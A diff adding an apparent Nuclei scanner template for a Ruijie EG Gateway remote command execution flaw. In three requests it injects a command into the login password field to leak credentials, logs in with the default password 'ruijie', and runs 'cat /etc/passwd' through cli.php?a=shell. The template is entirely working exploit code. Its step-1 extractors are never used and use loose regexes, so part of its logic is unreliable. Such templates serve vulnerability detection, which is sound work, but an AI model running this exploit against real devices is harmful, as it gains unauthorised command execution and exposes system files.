@@ -1,0 +1,98 @@
+id: ruijie-eg-gateway-cli-php-rce
+info:
+  name: Ruijie EG Gateway Remote Command Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  description: |
+    Exploits a remote command execution vulnerability in Ruijie EG Gateway's cli.php endpoint.
+
+variables:
+  username: ""
+  passwd: ""
+  cookie: ""
+
+flow: http(1) && http(2) && http(3)
+
+http:
+  - id: step-1
+    method: POST
+    path:
+      - "{{BaseURL}}/login.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: username=admin&password=admin?show+webmaster+user
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "data"
+      - type: word
+        part: header
+        words:
+          - "user=admin"
+    extractors:
+      - type: regex
+        name: username
+        internal: true
+        group: 1
+        regex:
+          - "(?P<username>[a-z0-9A-Z]{5,16})"
+      - type: regex
+        name: passwd
+        internal: true
+        group: 1
+        regex:
+          - "(?P<passwd>[a-z0-9A-Z]{6,16})"
+
+  - id: step-2
+    method: POST
+    path:
+      - "{{BaseURL}}/login.php"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: username=admin&password=ruijie
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{\"data\":\"0\",\"status\":1}"
+    extractors:
+      - type: regex
+        name: cookie
+        internal: true
+        group: 1
+        regex:
+          - "RUIJIEID=(?P<cookie>[0-9a-zA-Z]+)"
+
+  - id: step-3
+    method: POST
+    path:
+      - "{{BaseURL}}/cli.php?a=shell"
+    headers:
+      Cookie: "RUIJIEID={{cookie}}; user=admin"
+      Content-Type: application/x-www-form-urlencoded
+    body: notdelay=true&command=cat+/etc/passwd
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "/bin"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
